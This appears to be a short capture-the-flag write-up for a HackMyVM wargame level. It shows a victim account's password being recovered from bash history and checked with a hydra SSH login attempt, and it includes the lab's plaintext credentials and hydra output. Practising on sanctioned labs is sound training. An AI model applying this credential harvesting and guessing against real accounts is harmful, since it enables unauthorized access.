@@ -1,0 +1,39 @@
+# Login using the following credentials.
+
+ssh mercy@venus.hackmyvm.eu -p 5000
+pwd: ym5yyXZ163uIS8L
+
+Mission 0x42:
+User mercy is always wrong with the password of paula.
+
+Soln:
+
+-> If user mercy mistakes the password of paula every time he tries to login that means, there are multiple failed attempts which would be recorded in the history of 'bash', which is the terminal he used to login as the user paula in the first place.
+
+-> Let's begin with the "history" command.
+
+# mercy@venus:~$ history
+#     1  ls -A
+#     2  ls
+#     3  rm /
+#     4  ps
+#     5  sudo -l
+#     6  watch tv
+#     7  vi /etc/logs
+#     8  su paula
+#     9  dlHZ6cvX6cLuL8p
+#     ..
+#     ..
+#     24 history
+
+-> Would you look at that, the password sitting in the plain sight..!! Let's try it out using the "hydra" command to check if it is the actual password or is it the wrong password attempted.
+
+# ┌──(amogha㉿Amogha)-[~]
+# └─$ hydra -s 5000 -l paula -p dlHZ6cvX6cLuL8p venus.hackmyvm.eu ssh
+# [DATA] attacking ssh://venus.hackmyvm.eu:5000/
+# [5000][ssh] host: venus.hackmyvm.eu   login: paula   password: dlHZ6cvX6cLuL8p
+# 1 of 1 target successfully completed, 1 valid password found
+
+-> Yep, we've hit the nail on the coffin perfect.
+
+-> On the same note, alternatively you can also check a file in the user's (Mercy) home directory by the name ".bash_history", you wold find the same thing there as well.
